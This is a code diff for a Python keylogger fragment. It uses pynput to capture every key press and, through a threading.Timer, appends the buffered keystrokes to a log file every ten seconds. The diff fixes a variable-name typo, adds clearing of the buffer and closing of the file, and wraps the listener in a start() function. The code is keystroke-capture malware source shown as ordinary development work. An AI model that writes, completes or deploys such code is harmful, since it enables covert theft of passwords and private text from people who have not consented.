@@ -28,11 +28,18 @@ def process_keys(key):
     #with open("log.txt","a") as fin:
      #   fin.write(str(key))
 def report():
-    global lbg
+    global log
     global path
     fin = open(path, "a")
     fin.write(log)
-keyboard_listener = pynput.keyboard.Listener(on_press=process_keys)
-with keyboard_listener:
-    keyboard_listener.join()
+    log = ""
+    fin.close()
+    timer = threading.Timer(10,report)
+    timer.start()
+
+def start():
+    keyboard_listener = pynput.keyboard.Listener(on_press=process_keys)
+    with keyboard_listener:
+        report()
+        keyboard_listener.join()
         
